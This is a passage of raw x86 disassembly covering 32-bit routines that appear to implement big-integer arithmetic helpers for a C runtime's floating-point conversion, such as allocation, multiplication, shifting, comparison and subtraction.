  409c73:	test   eax,eax
  409c75:	mov    edi,eax
  409c77:	je     0x409cd9
  409c79:	cmp    DWORD PTR ds:0x410028,0x2
  409c80:	mov    DWORD PTR [edi+0x4],ebx
  409c83:	mov    DWORD PTR [edi+0x8],esi
  409c86:	je     0x409c43
  409c88:	mov    DWORD PTR [edi+0x10],0x0
  409c8f:	mov    DWORD PTR [edi+0xc],0x0
  409c96:	mov    eax,edi
  409c98:	add    esp,0x10
  409c9b:	pop    ebx
  409c9c:	pop    esi
  409c9d:	pop    edi
  409c9e:	ret    
  409c9f:	nop
  409ca0:	mov    edi,DWORD PTR ds:0x40c04c
  409ca6:	mov    ecx,ebx
  409ca8:	mov    esi,0x1
  409cad:	shl    esi,cl
  409caf:	lea    edx,[esi*4+0x1b]
  409cb6:	mov    ecx,edi
  409cb8:	sub    ecx,0x40f700
  409cbe:	shr    edx,0x3
  409cc1:	sar    ecx,0x3
  409cc4:	add    ecx,edx
  409cc6:	cmp    ecx,0x120
  409ccc:	ja     0x409c68
  409cce:	lea    edx,[edi+edx*8]
  409cd1:	mov    DWORD PTR ds:0x40c04c,edx
  409cd7:	jmp    0x409c79
  409cd9:	xor    eax,eax
  409cdb:	jmp    0x409c98
  409cdd:	lea    esi,[esi+0x0]
  409ce0:	push   ebx
  409ce1:	sub    esp,0x18
  409ce4:	mov    ebx,DWORD PTR [esp+0x20]
  409ce8:	test   ebx,ebx
  409cea:	je     0x409d15
  409cec:	cmp    DWORD PTR [ebx+0x4],0x9
  409cf0:	jg     0x409d20
  409cf2:	xor    eax,eax
  409cf4:	call   0x409b00
  409cf9:	mov    eax,DWORD PTR [ebx+0x4]
  409cfc:	cmp    DWORD PTR ds:0x410028,0x2
  409d03:	mov    edx,DWORD PTR [eax*4+0x410000]
  409d0a:	mov    DWORD PTR [eax*4+0x410000],ebx
  409d11:	mov    DWORD PTR [ebx],edx
  409d13:	je     0x409d30
  409d15:	add    esp,0x18
  409d18:	pop    ebx
  409d19:	ret    
  409d1a:	lea    esi,[esi+0x0]
  409d20:	add    esp,0x18
  409d23:	pop    ebx
  409d24:	jmp    0x40ad10
  409d29:	lea    esi,[esi+eiz*1+0x0]
  409d30:	mov    DWORD PTR [esp],0x410040
  409d37:	call   DWORD PTR ds:0x4112d8
  409d3d:	sub    esp,0x4
  409d40:	add    esp,0x18
  409d43:	pop    ebx
  409d44:	ret    
  409d45:	lea    esi,[esi+eiz*1+0x0]
  409d49:	lea    edi,[edi+eiz*1+0x0]
  409d50:	push   ebp
  409d51:	push   edi
  409d52:	xor    ecx,ecx
  409d54:	push   esi
  409d55:	push   ebx
  409d56:	sub    esp,0x2c
  409d59:	mov    eax,DWORD PTR [esp+0x40]
  409d5d:	mov    edi,DWORD PTR [esp+0x48]
  409d61:	mov    eax,DWORD PTR [eax+0x10]
  409d64:	mov    ebp,edi
  409d66:	sar    ebp,0x1f
  409d69:	mov    DWORD PTR [esp+0x1c],eax
  409d6d:	mov    eax,DWORD PTR [esp+0x40]
  409d71:	lea    ebx,[eax+0x14]
  409d74:	mov    eax,DWORD PTR [esp+0x44]
  409d78:	mov    DWORD PTR [esp+0x10],eax
  409d7c:	sar    eax,0x1f
  409d7f:	mov    DWORD PTR [esp+0x14],eax
  409d83:	mov    eax,DWORD PTR [ebx+ecx*4]
  409d86:	mov    esi,DWORD PTR [esp+0x14]
  409d8a:	imul   esi,eax
  409d8d:	mul    DWORD PTR [esp+0x10]
  409d91:	add    edx,esi
  409d93:	add    eax,edi
  409d95:	adc    edx,ebp
  409d97:	mov    DWORD PTR [ebx+ecx*4],eax
  409d9a:	xor    ebp,ebp
  409d9c:	add    ecx,0x1
  409d9f:	cmp    DWORD PTR [esp+0x1c],ecx
  409da3:	mov    edi,edx
  409da5:	jg     0x409d83
  409da7:	mov    edx,ebp
  409da9:	mov    eax,DWORD PTR [esp+0x40]
  409dad:	or     edx,edi
  409daf:	je     0x409dce
  409db1:	mov    edx,DWORD PTR [esp+0x1c]
  409db5:	cmp    edx,DWORD PTR [eax+0x8]
  409db8:	jge    0x409de0
  409dba:	mov    edx,DWORD PTR [esp+0x40]
  409dbe:	mov    eax,DWORD PTR [esp+0x1c]
  409dc2:	mov    DWORD PTR [edx+eax*4+0x14],edi
  409dc6:	add    eax,0x1
  409dc9:	mov    DWORD PTR [edx+0x10],eax
  409dcc:	mov    eax,edx
  409dce:	add    esp,0x2c
  409dd1:	pop    ebx
  409dd2:	pop    esi
  409dd3:	pop    edi
  409dd4:	pop    ebp
  409dd5:	ret    
  409dd6:	lea    esi,[esi+0x0]
  409dd9:	lea    edi,[edi+eiz*1+0x0]
  409de0:	mov    eax,DWORD PTR [eax+0x4]
  409de3:	mov    DWORD PTR [esp+0x10],eax
  409de7:	add    eax,0x1
  409dea:	mov    DWORD PTR [esp],eax
  409ded:	call   0x409c10
  409df2:	test   eax,eax
  409df4:	mov    ebx,eax
  409df6:	je     0x409e32
  409df8:	lea    ecx,[eax+0xc]
  409dfb:	mov    eax,DWORD PTR [esp+0x40]
  409dff:	mov    eax,DWORD PTR [eax+0x10]
  409e02:	mov    DWORD PTR [esp],ecx
  409e05:	lea    edx,[eax*4+0x8]
  409e0c:	mov    eax,DWORD PTR [esp+0x40]
  409e10:	mov    DWORD PTR [esp+0x8],edx
  409e14:	add    eax,0xc
  409e17:	mov    DWORD PTR [esp+0x4],eax
  409e1b:	call   0x40ace8
  409e20:	mov    eax,DWORD PTR [esp+0x40]
  409e24:	mov    DWORD PTR [esp],eax
  409e27:	call   0x409ce0
  409e2c:	mov    DWORD PTR [esp+0x40],ebx
  409e30:	jmp    0x409dba
  409e32:	xor    eax,eax
  409e34:	jmp    0x409dce
  409e36:	lea    esi,[esi+0x0]
  409e39:	lea    edi,[edi+eiz*1+0x0]
  409e40:	sub    esp,0x1c
  409e43:	mov    DWORD PTR [esp],0x1
  409e4a:	call   0x409c10
  409e4f:	test   eax,eax
  409e51:	je     0x409e61
  409e53:	mov    edx,DWORD PTR [esp+0x20]
  409e57:	mov    DWORD PTR [eax+0x10],0x1
  409e5e:	mov    DWORD PTR [eax+0x14],edx
  409e61:	add    esp,0x1c
  409e64:	ret    
  409e65:	lea    esi,[esi+eiz*1+0x0]
  409e69:	lea    edi,[edi+eiz*1+0x0]
  409e70:	push   ebp
  409e71:	push   edi
  409e72:	push   esi
  409e73:	push   ebx
  409e74:	sub    esp,0x4c
  409e77:	mov    edi,DWORD PTR [esp+0x60]
  409e7b:	mov    ebp,DWORD PTR [esp+0x64]
  409e7f:	mov    ebx,DWORD PTR [edi+0x10]
  409e82:	mov    esi,DWORD PTR [ebp+0x10]
  409e85:	cmp    ebx,esi
  409e87:	jl     0x409fd4
  409e8d:	mov    eax,esi
  409e8f:	mov    esi,ebx
  409e91:	mov    ebx,eax
  409e93:	lea    eax,[esi+ebx*1]
  409e96:	cmp    eax,DWORD PTR [edi+0x8]
  409e99:	mov    DWORD PTR [esp+0x34],eax
  409e9d:	setg   al
  409ea0:	movzx  eax,al
  409ea3:	add    eax,DWORD PTR [edi+0x4]
  409ea6:	mov    DWORD PTR [esp],eax
  409ea9:	call   0x409c10
  409eae:	test   eax,eax
  409eb0:	mov    DWORD PTR [esp+0x3c],eax
  409eb4:	je     0x409fdf
  409eba:	mov    ecx,DWORD PTR [esp+0x34]
  409ebe:	lea    eax,[eax+0x14]
  409ec1:	mov    DWORD PTR [esp+0x28],eax
  409ec5:	lea    ecx,[eax+ecx*4]
  409ec8:	mov    edx,ecx
  409eca:	mov    DWORD PTR [esp+0x38],ecx
  409ece:	cmp    eax,edx
  409ed0:	jae    0x409eed
  409ed2:	mov    edx,DWORD PTR [esp+0x38]
  409ed6:	lea    esi,[esi+0x0]
  409ed9:	lea    edi,[edi+eiz*1+0x0]
  409ee0:	mov    DWORD PTR [eax],0x0
  409ee6:	add    eax,0x4
  409ee9:	cmp    edx,eax
  409eeb:	ja     0x409ee0
  409eed:	lea    eax,[edi+0x14]
  409ef0:	mov    DWORD PTR [esp+0x30],eax
  409ef4:	lea    eax,[eax+esi*4]
  409ef7:	mov    DWORD PTR [esp+0x20],eax
  409efb:	lea    eax,[ebp+0x14]
  409efe:	lea    esi,[eax+ebx*4]
  409f01:	mov    DWORD PTR [esp+0x24],eax
  409f05:	cmp    eax,esi
  409f07:	mov    DWORD PTR [esp+0x2c],esi
  409f0b:	jae    0x409f8e
  409f11:	add    DWORD PTR [esp+0x24],0x4
  409f16:	mov    eax,DWORD PTR [esp+0x24]
  409f1a:	mov    ebp,DWORD PTR [eax-0x4]
  409f1d:	test   ebp,ebp
  409f1f:	je     0x409f7f
  409f21:	mov    edi,DWORD PTR [esp+0x28]
  409f25:	xor    ebx,ebx
  409f27:	xor    ecx,ecx
  409f29:	mov    edx,ebx
  409f2b:	mov    DWORD PTR [esp+0x1c],ebp
  409f2f:	mov    esi,DWORD PTR [esp+0x30]
  409f33:	mov    ebp,edx
  409f35:	mov    ebx,edi
  409f37:	mov    edi,ecx
  409f39:	jmp    0x409f42
  409f3b:	nop
  409f3c:	lea    esi,[esi+eiz*1+0x0]
  409f40:	mov    ebx,ecx
  409f42:	mov    eax,DWORD PTR [ebx]
  409f44:	add    esi,0x4
  409f47:	xor    edx,edx
  409f49:	mov    DWORD PTR [esp+0x14],edx
  409f4d:	mov    DWORD PTR [esp+0x10],eax
  409f51:	mov    eax,DWORD PTR [esp+0x1c]
  409f55:	mul    DWORD PTR [esi-0x4]
  409f58:	mov    ecx,edx
  409f5a:	mov    edx,eax
  409f5c:	add    edx,DWORD PTR [esp+0x10]
  409f60:	adc    ecx,DWORD PTR [esp+0x14]
  409f64:	add    edx,edi
  409f66:	adc    ecx,ebp
  409f68:	xor    ebp,ebp
  409f6a:	cmp    DWORD PTR [esp+0x20],esi
  409f6e:	mov    edi,ecx
  409f70:	lea    ecx,[ebx+0x4]
  409f73:	mov    DWORD PTR [ecx-0x4],edx
  409f76:	ja     0x409f40
  409f78:	mov    eax,edi
  409f7a:	mov    edi,ebx
  409f7c:	mov    DWORD PTR [edi+0x4],eax
  409f7f:	add    DWORD PTR [esp+0x28],0x4
  409f84:	mov    ebx,DWORD PTR [esp+0x24]
  409f88:	cmp    DWORD PTR [esp+0x2c],ebx
  409f8c:	ja     0x409f11
  409f8e:	mov    eax,DWORD PTR [esp+0x34]
  409f92:	test   eax,eax
  409f94:	jle    0x409fc1
  409f96:	mov    ecx,DWORD PTR [esp+0x38]
  409f9a:	mov    ebx,DWORD PTR [ecx-0x4]
  409f9d:	test   ebx,ebx
  409f9f:	jne    0x409fc1
  409fa1:	mov    edx,DWORD PTR [esp+0x34]
  409fa5:	mov    eax,edx
  409fa7:	shl    eax,0x2
  409faa:	sub    ecx,eax
  409fac:	mov    eax,ecx
  409fae:	jmp    0x409fb8
  409fb0:	mov    ecx,DWORD PTR [eax+edx*4-0x4]
  409fb4:	test   ecx,ecx
  409fb6:	jne    0x409fbd
  409fb8:	sub    edx,0x1
  409fbb:	jne    0x409fb0
  409fbd:	mov    DWORD PTR [esp+0x34],edx
  409fc1:	mov    eax,DWORD PTR [esp+0x3c]
  409fc5:	mov    ecx,DWORD PTR [esp+0x34]
  409fc9:	mov    DWORD PTR [eax+0x10],ecx
  409fcc:	add    esp,0x4c
  409fcf:	pop    ebx
  409fd0:	pop    esi
  409fd1:	pop    edi
  409fd2:	pop    ebp
  409fd3:	ret    
  409fd4:	mov    eax,edi
  409fd6:	mov    edi,ebp
  409fd8:	mov    ebp,eax
  409fda:	jmp    0x409e93
  409fdf:	xor    eax,eax
  409fe1:	jmp    0x409fcc
  409fe3:	lea    esi,[esi+0x0]
  409fe9:	lea    edi,[edi+eiz*1+0x0]
  409ff0:	push   ebp
  409ff1:	push   edi
  409ff2:	push   esi
  409ff3:	push   ebx
  409ff4:	sub    esp,0x1c
  409ff7:	mov    ebx,DWORD PTR [esp+0x34]
  409ffb:	mov    ebp,DWORD PTR [esp+0x30]
  409fff:	mov    eax,ebx
  40a001:	and    eax,0x3
  40a004:	jne    0x40a0a0
  40a00a:	sar    ebx,0x2
  40a00d:	mov    eax,ebp
  40a00f:	test   ebx,ebx
  40a011:	je     0x40a063
  40a013:	mov    edi,DWORD PTR ds:0x40f6c0
  40a019:	test   edi,edi
  40a01b:	je     0x40a0eb
  40a021:	test   bl,0x1
  40a024:	jne    0x40a041
  40a026:	lea    esi,[esi+0x0]
  40a029:	lea    edi,[edi+eiz*1+0x0]
  40a030:	sar    ebx,1
  40a032:	je     0x40a061
  40a034:	mov    esi,DWORD PTR [edi]
  40a036:	test   esi,esi
  40a038:	je     0x40a070
  40a03a:	mov    edi,esi
  40a03c:	test   bl,0x1
  40a03f:	je     0x40a030
  40a041:	mov    DWORD PTR [esp+0x4],edi
  40a045:	mov    DWORD PTR [esp],ebp
  40a048:	call   0x409e70
  40a04d:	test   eax,eax
  40a04f:	mov    esi,eax
  40a051:	je     0x40a0c5
  40a053:	mov    DWORD PTR [esp],ebp
  40a056:	mov    ebp,esi
  40a058:	call   0x409ce0
  40a05d:	sar    ebx,1
  40a05f:	jne    0x40a034
  40a061:	mov    eax,ebp
  40a063:	add    esp,0x1c
  40a066:	pop    ebx
  40a067:	pop    esi
  40a068:	pop    edi
  40a069:	pop    ebp
  40a06a:	ret    
  40a06b:	nop
  40a06c:	lea    esi,[esi+eiz*1+0x0]
  40a070:	mov    eax,0x1
  40a075:	call   0x409b00
  40a07a:	mov    esi,DWORD PTR [edi]
  40a07c:	test   esi,esi
  40a07e:	je     0x40a0cf
  40a080:	cmp    DWORD PTR ds:0x410028,0x2
  40a087:	jne    0x40a03a
  40a089:	mov    DWORD PTR [esp],0x410058
  40a090:	mov    edi,esi
  40a092:	call   DWORD PTR ds:0x4112d8
  40a098:	sub    esp,0x4
  40a09b:	jmp    0x40a03c
  40a09d:	lea    esi,[esi+0x0]
  40a0a0:	mov    eax,DWORD PTR [eax*4+0x40e07c]
  40a0a7:	mov    DWORD PTR [esp],ebp
  40a0aa:	mov    DWORD PTR [esp+0x8],0x0
  40a0b2:	mov    DWORD PTR [esp+0x4],eax
  40a0b6:	call   0x409d50
  40a0bb:	test   eax,eax
  40a0bd:	mov    ebp,eax
  40a0bf:	jne    0x40a00a
  40a0c5:	xor    eax,eax
  40a0c7:	add    esp,0x1c
  40a0ca:	pop    ebx
  40a0cb:	pop    esi
  40a0cc:	pop    edi
  40a0cd:	pop    ebp
  40a0ce:	ret    
  40a0cf:	mov    DWORD PTR [esp+0x4],edi
  40a0d3:	mov    DWORD PTR [esp],edi
  40a0d6:	call   0x409e70
  40a0db:	test   eax,eax
  40a0dd:	mov    esi,eax
  40a0df:	mov    DWORD PTR [edi],eax
  40a0e1:	je     0x40a0c5
  40a0e3:	mov    DWORD PTR [eax],0x0
  40a0e9:	jmp    0x40a080
  40a0eb:	mov    eax,0x1
  40a0f0:	call   0x409b00
  40a0f5:	mov    edi,DWORD PTR ds:0x40f6c0
  40a0fb:	test   edi,edi
  40a0fd:	je     0x40a121
  40a0ff:	cmp    DWORD PTR ds:0x410028,0x2
  40a106:	jne    0x40a021
  40a10c:	mov    DWORD PTR [esp],0x410058
  40a113:	call   DWORD PTR ds:0x4112d8
  40a119:	sub    esp,0x4
  40a11c:	jmp    0x40a021
  40a121:	mov    DWORD PTR [esp],0x1
  40a128:	call   0x409c10
  40a12d:	test   eax,eax
  40a12f:	mov    edi,eax
  40a131:	je     0x40a14e
  40a133:	mov    DWORD PTR [eax+0x14],0x271
  40a13a:	mov    DWORD PTR [eax+0x10],0x1
  40a141:	mov    ds:0x40f6c0,eax
  40a146:	mov    DWORD PTR [eax],0x0
  40a14c:	jmp    0x40a0ff
  40a14e:	mov    DWORD PTR ds:0x40f6c0,0x0
  40a158:	xor    eax,eax
  40a15a:	jmp    0x40a0c7
  40a15f:	nop
  40a160:	push   ebp
  40a161:	push   edi
  40a162:	push   esi
  40a163:	push   ebx
  40a164:	sub    esp,0x3c
  40a167:	mov    eax,DWORD PTR [esp+0x50]
  40a16b:	mov    edi,DWORD PTR [esp+0x54]
  40a16f:	mov    ecx,eax
  40a171:	mov    edx,DWORD PTR [eax+0x4]
  40a174:	mov    eax,DWORD PTR [eax+0x10]
  40a177:	sar    edi,0x5
  40a17a:	add    eax,edi
  40a17c:	lea    esi,[eax+0x1]
  40a17f:	mov    DWORD PTR [esp+0x28],eax
  40a183:	mov    eax,DWORD PTR [ecx+0x8]
  40a186:	cmp    esi,eax
  40a188:	jle    0x40a199
  40a18a:	lea    esi,[esi+0x0]
  40a190:	add    eax,eax
  40a192:	add    edx,0x1
  40a195:	cmp    esi,eax
  40a197:	jg     0x40a190
  40a199:	mov    DWORD PTR [esp],edx
  40a19c:	call   0x409c10
  40a1a1:	test   eax,eax
  40a1a3:	mov    DWORD PTR [esp+0x24],eax
  40a1a7:	je     0x40a282
  40a1ad:	test   edi,edi
  40a1af:	lea    ebx,[eax+0x14]
  40a1b2:	jle    0x40a1d1
  40a1b4:	xor    eax,eax
  40a1b6:	lea    esi,[esi+0x0]
  40a1b9:	lea    edi,[edi+eiz*1+0x0]
  40a1c0:	mov    DWORD PTR [ebx+eax*4],0x0
  40a1c7:	add    eax,0x1
  40a1ca:	cmp    eax,edi
  40a1cc:	jne    0x40a1c0
  40a1ce:	lea    ebx,[ebx+eax*4]
  40a1d1:	mov    eax,DWORD PTR [esp+0x50]
  40a1d5:	lea    edx,[eax+0x14]
  40a1d8:	mov    eax,DWORD PTR [eax+0x10]
  40a1db:	lea    ebp,[edx+eax*4]
  40a1de:	mov    eax,DWORD PTR [esp+0x54]
  40a1e2:	and    eax,0x1f
  40a1e5:	mov    DWORD PTR [esp+0x1c],eax
  40a1e9:	je     0x40a260
  40a1eb:	mov    eax,0x20
  40a1f0:	sub    eax,DWORD PTR [esp+0x1c]
  40a1f4:	mov    DWORD PTR [esp+0x2c],esi
  40a1f8:	mov    edi,eax
  40a1fa:	xor    eax,eax
  40a1fc:	mov    DWORD PTR [esp+0x20],edi
  40a200:	jmp    0x40a204
  40a202:	mov    ebx,esi
  40a204:	movzx  ecx,BYTE PTR [esp+0x1c]
  40a209:	mov    edi,DWORD PTR [edx]
  40a20b:	lea    esi,[ebx+0x4]
  40a20e:	add    edx,0x4
  40a211:	shl    edi,cl
  40a213:	movzx  ecx,BYTE PTR [esp+0x20]
  40a218:	or     eax,edi
  40a21a:	mov    DWORD PTR [esi-0x4],eax
  40a21d:	mov    eax,DWORD PTR [edx-0x4]
  40a220:	shr    eax,cl
  40a222:	cmp    ebp,edx
  40a224:	ja     0x40a202
  40a226:	mov    edx,DWORD PTR [esp+0x28]
  40a22a:	mov    esi,DWORD PTR [esp+0x2c]
  40a22e:	mov    DWORD PTR [ebx+0x4],eax
  40a231:	add    edx,0x2
  40a234:	test   eax,eax
  40a236:	cmovne esi,edx
  40a239:	mov    edi,DWORD PTR [esp+0x24]
  40a23d:	mov    eax,DWORD PTR [esp+0x50]
  40a241:	sub    esi,0x1
  40a244:	mov    DWORD PTR [edi+0x10],esi
  40a247:	mov    DWORD PTR [esp],eax
  40a24a:	call   0x409ce0
  40a24f:	mov    eax,edi
  40a251:	add    esp,0x3c
  40a254:	pop    ebx
  40a255:	pop    esi
  40a256:	pop    edi
  40a257:	pop    ebp
  40a258:	ret    
  40a259:	lea    esi,[esi+eiz*1+0x0]
  40a260:	add    edx,0x4
  40a263:	mov    eax,DWORD PTR [edx-0x4]
  40a266:	add    ebx,0x4
  40a269:	cmp    ebp,edx
  40a26b:	mov    DWORD PTR [ebx-0x4],eax
  40a26e:	jbe    0x40a239
  40a270:	add    edx,0x4
  40a273:	mov    eax,DWORD PTR [edx-0x4]
  40a276:	add    ebx,0x4
  40a279:	cmp    ebp,edx
  40a27b:	mov    DWORD PTR [ebx-0x4],eax
  40a27e:	ja     0x40a260
  40a280:	jmp    0x40a239
  40a282:	xor    eax,eax
  40a284:	jmp    0x40a251
  40a286:	lea    esi,[esi+0x0]
  40a289:	lea    edi,[edi+eiz*1+0x0]
  40a290:	push   ebx
  40a291:	mov    ecx,DWORD PTR [esp+0x8]
  40a295:	mov    ebx,DWORD PTR [esp+0xc]
  40a299:	mov    eax,DWORD PTR [ecx+0x10]
  40a29c:	mov    edx,DWORD PTR [ebx+0x10]
  40a29f:	sub    eax,edx
  40a2a1:	test   eax,eax
  40a2a3:	jne    0x40a2c9
  40a2a5:	shl    edx,0x2
  40a2a8:	add    ecx,0x14
  40a2ab:	lea    eax,[ecx+edx*1]
  40a2ae:	lea    edx,[ebx+edx*1+0x14]
  40a2b2:	jmp    0x40a2b8
  40a2b4:	cmp    ecx,eax
  40a2b6:	jae    0x40a2d0
  40a2b8:	sub    edx,0x4
  40a2bb:	sub    eax,0x4
  40a2be:	mov    ebx,DWORD PTR [edx]
  40a2c0:	cmp    DWORD PTR [eax],ebx
  40a2c2:	je     0x40a2b4
  40a2c4:	sbb    eax,eax
  40a2c6:	or     eax,0x1
  40a2c9:	pop    ebx
  40a2ca:	ret    
  40a2cb:	nop
  40a2cc:	lea    esi,[esi+eiz*1+0x0]
  40a2d0:	xor    eax,eax
  40a2d2:	pop    ebx
  40a2d3:	ret    
  40a2d4:	lea    esi,[esi+0x0]
  40a2da:	lea    edi,[edi+0x0]
  40a2e0:	push   ebp
  40a2e1:	push   edi
  40a2e2:	push   esi
  40a2e3:	push   ebx
  40a2e4:	sub    esp,0x3c
  40a2e7:	mov    ebp,DWORD PTR [esp+0x50]
  40a2eb:	mov    esi,DWORD PTR [esp+0x54]
  40a2ef:	mov    DWORD PTR [esp],ebp
  40a2f2:	mov    DWORD PTR [esp+0x4],esi
  40a2f6:	call   0x40a290
  40a2fb:	test   eax,eax
  40a2fd:	je     0x40a432
  40a303:	mov    ebx,0x0
  40a308:	js     0x40a460
  40a30e:	mov    eax,DWORD PTR [ebp+0x4]
  40a311:	mov    DWORD PTR [esp],eax
  40a314:	call   0x409c10
  40a319:	test   eax,eax
  40a31b:	mov    DWORD PTR [esp+0x28],eax
  40a31f:	mov    edi,eax
  40a321:	je     0x40a46d
  40a327:	mov    DWORD PTR [eax+0xc],ebx
  40a32a:	mov    eax,DWORD PTR [ebp+0x10]
  40a32d:	add    ebp,0x14
  40a330:	lea    ebx,[esi+0x14]
  40a333:	lea    ecx,[edi+0x14]
  40a336:	xor    edi,edi
  40a338:	mov    DWORD PTR [esp+0x14],edi
  40a33c:	mov    DWORD PTR [esp+0x20],eax
  40a340:	lea    eax,[ebp+eax*4+0x0]
  40a344:	mov    DWORD PTR [esp+0x24],eax
  40a348:	mov    eax,DWORD PTR [esi+0x10]
  40a34b:	xor    esi,esi
  40a34d:	mov    DWORD PTR [esp+0x10],esi
  40a351:	lea    eax,[ebx+eax*4]
  40a354:	mov    DWORD PTR [esp+0x1c],eax
  40a358:	nop
  40a359:	lea    esi,[esi+eiz*1+0x0]
  40a360:	add    ebx,0x4
  40a363:	add    ebp,0x4
  40a366:	mov    eax,DWORD PTR [ebp-0x4]
  40a369:	mov    esi,DWORD PTR [ebx-0x4]
  40a36c:	xor    edi,edi
  40a36e:	xor    edx,edx
  40a370:	sub    eax,esi
  40a372:	sbb    edx,edi
  40a374:	sub    eax,DWORD PTR [esp+0x10]
  40a378:	sbb    edx,DWORD PTR [esp+0x14]
  40a37c:	add    ecx,0x4
  40a37f:	mov    DWORD PTR [esp+0x14],0x0
  40a387:	mov    edi,edx
  40a389:	mov    DWORD PTR [ecx-0x4],eax
  40a38c:	mov    edx,eax
  40a38e:	and    edi,0x1
  40a391:	cmp    DWORD PTR [esp+0x1c],ebx
  40a395:	mov    DWORD PTR [esp+0x10],edi
  40a399:	ja     0x40a360
  40a39b:	mov    eax,DWORD PTR [esp+0x24]
  40a39f:	mov    esi,DWORD PTR [esp+0x10]
  40a3a3:	mov    edi,DWORD PTR [esp+0x14]
  40a3a7:	mov    DWORD PTR [esp+0x1c],ebp
  40a3ab:	cmp    eax,ebp
  40a3ad:	jbe    0x40a3fa
  40a3af:	mov    DWORD PTR [esp+0x2c],ecx
  40a3b3:	mov    DWORD PTR [esp+0x10],eax
  40a3b7:	mov    esi,esi
  40a3b9:	lea    edi,[edi+eiz*1+0x0]
  40a3c0:	add    ebp,0x4
  40a3c3:	mov    eax,DWORD PTR [ebp-0x4]
  40a3c6:	xor    edx,edx
  40a3c8:	sub    eax,esi
  40a3ca:	sbb    edx,edi
  40a3cc:	add    ecx,0x4
  40a3cf:	xor    edi,edi
  40a3d1:	mov    ebx,edx
  40a3d3:	mov    DWORD PTR [ecx-0x4],eax
  40a3d6:	mov    edx,eax
  40a3d8:	and    ebx,0x1
  40a3db:	cmp    DWORD PTR [esp+0x10],ebp
  40a3df:	mov    esi,ebx
  40a3e1:	ja     0x40a3c0
  40a3e3:	mov    esi,DWORD PTR [esp+0x1c]
  40a3e7:	mov    eax,DWORD PTR [esp+0x24]
  40a3eb:	mov    ebx,DWORD PTR [esp+0x2c]
  40a3ef:	not    esi
  40a3f1:	add    eax,esi
  40a3f3:	shr    eax,0x2
  40a3f6:	lea    ecx,[ebx+eax*4+0x4]
  40a3fa:	test   edx,edx
  40a3fc:	jne    0x40a41f
  40a3fe:	mov    edi,DWORD PTR [esp+0x20]
  40a402:	mov    eax,edi
  40a404:	shl    eax,0x2
  40a407:	sub    ecx,eax
  40a409:	mov    eax,edi
  40a40b:	nop
  40a40c:	lea    esi,[esi+eiz*1+0x0]
  40a410:	sub    eax,0x1
  40a413:	mov    edx,DWORD PTR [ecx+eax*4-0x4]
  40a417:	test   edx,edx
  40a419:	je     0x40a410
  40a41b:	mov    DWORD PTR [esp+0x20],eax
  40a41f:	mov    eax,DWORD PTR [esp+0x28]
  40a423:	mov    ecx,DWORD PTR [esp+0x20]
  40a427:	mov    DWORD PTR [eax+0x10],ecx
  40a42a:	add    esp,0x3c
  40a42d:	pop    ebx
  40a42e:	pop    esi
  40a42f:	pop    edi
  40a430:	pop    ebp
  40a431:	ret    
  40a432:	mov    DWORD PTR [esp],0x0
  40a439:	call   0x409c10
  40a43e:	test   eax,eax
  40a440:	je     0x40a46d
  40a442:	mov    DWORD PTR [eax+0x10],0x1
  40a449:	mov    DWORD PTR [eax+0x14],0x0
  40a450:	add    esp,0x3c
  40a453:	pop    ebx
  40a454:	pop    esi
  40a455:	pop    edi
  40a456:	pop    ebp
  40a457:	ret    
  40a458:	nop
  40a459:	lea    esi,[esi+eiz*1+0x0]
  40a460:	mov    eax,ebp
  40a462:	mov    bl,0x1
  40a464:	mov    ebp,esi
  40a466:	mov    esi,eax
  40a468:	jmp    0x40a30e
  40a46d:	xor    eax,eax
  40a46f:	jmp    0x40a42a
  40a471:	jmp    0x40a480
  40a473:	nop
  40a474:	nop
  40a475:	nop
  40a476:	nop
  40a477:	nop
  40a478:	nop
  40a479:	nop
  40a47a:	nop
  40a47b:	nop
  40a47c:	nop
  40a47d:	nop
  40a47e:	nop
  40a47f:	nop
  40a480:	push   ebp
  40a481:	push   edi
  40a482:	mov    ecx,0x20
  40a487:	push   esi
  40a488:	push   ebx
  40a489:	sub    esp,0x14
  40a48c:	mov    eax,DWORD PTR [esp+0x28]
  40a490:	mov    ebp,DWORD PTR [esp+0x2c]
  40a494:	lea    esi,[eax+0x14]
  40a497:	mov    eax,DWORD PTR [eax+0x10]
  40a49a:	lea    ebx,[esi+eax*4]
  40a49d:	mov    edx,DWORD PTR [ebx-0x4]
  40a4a0:	lea    edi,[ebx-0x4]
  40a4a3:	bsr    eax,edx
  40a4a6:	xor    eax,0x1f
  40a4a9:	sub    ecx,eax
  40a4ab:	cmp    eax,0xa
  40a4ae:	mov    DWORD PTR [ebp+0x0],ecx
  40a4b1:	jg     0x40a4f0
  40a4b3:	mov    ecx,0xb
  40a4b8:	mov    ebp,edx
  40a4ba:	mov    DWORD PTR [esp],0x0
  40a4c1:	sub    ecx,eax
  40a4c3:	shr    ebp,cl
  40a4c5:	or     ebp,0x3ff00000
  40a4cb:	mov    DWORD PTR [esp+0x4],ebp
  40a4cf:	xor    ebp,ebp
  40a4d1:	cmp    esi,edi
  40a4d3:	jae    0x40a4da
  40a4d5:	mov    ebp,DWORD PTR [ebx-0x8]
  40a4d8:	shr    ebp,cl
  40a4da:	lea    ecx,[eax+0x15]
  40a4dd:	shl    edx,cl
  40a4df:	or     ebp,edx
  40a4e1:	mov    DWORD PTR [esp],ebp
  40a4e4:	fld    QWORD PTR [esp]
  40a4e7:	add    esp,0x14
  40a4ea:	pop    ebx
  40a4eb:	pop    esi
  40a4ec:	pop    edi
  40a4ed:	pop    ebp
  40a4ee:	ret    
  40a4ef:	nop
  40a4f0:	cmp    esi,edi
  40a4f2:	jae    0x40a560
  40a4f4:	lea    edi,[ebx-0x8]
  40a4f7:	mov    ebp,eax
  40a4f9:	sub    ebp,0xb
  40a4fc:	mov    DWORD PTR [esp+0xc],edi
  40a500:	mov    edi,DWORD PTR [ebx-0x8]
  40a503:	je     0x40a584
  40a505:	mov    ecx,0x2b
  40a50a:	sub    ecx,eax
  40a50c:	mov    eax,ecx
  40a50e:	mov    ecx,ebp
  40a510:	shl    edx,cl
  40a512:	mov    ecx,eax
  40a514:	mov    DWORD PTR [esp],edx
  40a517:	mov    edx,edi
  40a519:	shr    edx,cl
  40a51b:	mov    ecx,edx
  40a51d:	mov    edx,DWORD PTR [esp]
  40a520:	mov    DWORD PTR [esp],0x0
  40a527:	or     edx,ecx
  40a529:	or     edx,0x3ff00000
  40a52f:	mov    DWORD PTR [esp+0x4],edx
  40a533:	xor    edx,edx
  40a535:	cmp    esi,DWORD PTR [esp+0xc]
  40a539:	jae    0x40a542
  40a53b:	mov    edx,DWORD PTR [ebx-0xc]
  40a53e:	mov    ecx,eax
  40a540:	shr    edx,cl
